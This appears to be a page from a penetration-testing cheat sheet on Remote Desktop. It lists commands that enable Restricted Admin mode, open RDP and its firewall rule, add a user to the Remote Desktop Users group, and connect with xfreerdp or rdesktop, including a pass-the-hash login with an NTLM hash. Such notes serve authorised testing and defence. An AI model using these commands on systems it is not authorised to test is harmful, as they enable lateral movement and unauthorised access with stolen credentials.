---
title: Remote Desktop
parent: General Usage
layout: default
nav_order: 22
---

Enabling restricted admin (to use RDP):\
`New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa'  -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD`

Firewall for RDP:\
`Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0;Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

Add yourself to be able to remote (both works):\
`net localgroup "Remote Desktop Users" "UserName" /add`\
OR\
`powershell.exe Add-LocalGroupMember -Group "Remote Desktop Users" -Member "UserName"`

xfreerdp:\
`xfreerdp /cert:ignore /v:server /port:port /u:user@domain /p:password /size:1720x880 /drive:kalitemp,/tmp/ +clipboard`

rdesktop (domain connection use this):\
`rdesktop -u user@domain -p password -g 90% IP`

Pass the **hash**, no need to add LM hash! (add `/sec:tls` if this does not work):\
`xfreerdp /cert:ignore /v:server /port:port /u:user@domain /pth:4c027eb32130982d1b960575d66f31d9/drive:kalitemp,/tmp/ +clipboard`

If cannot connect, try adding append this to the end of command:\
`/tls-seclevel:0`
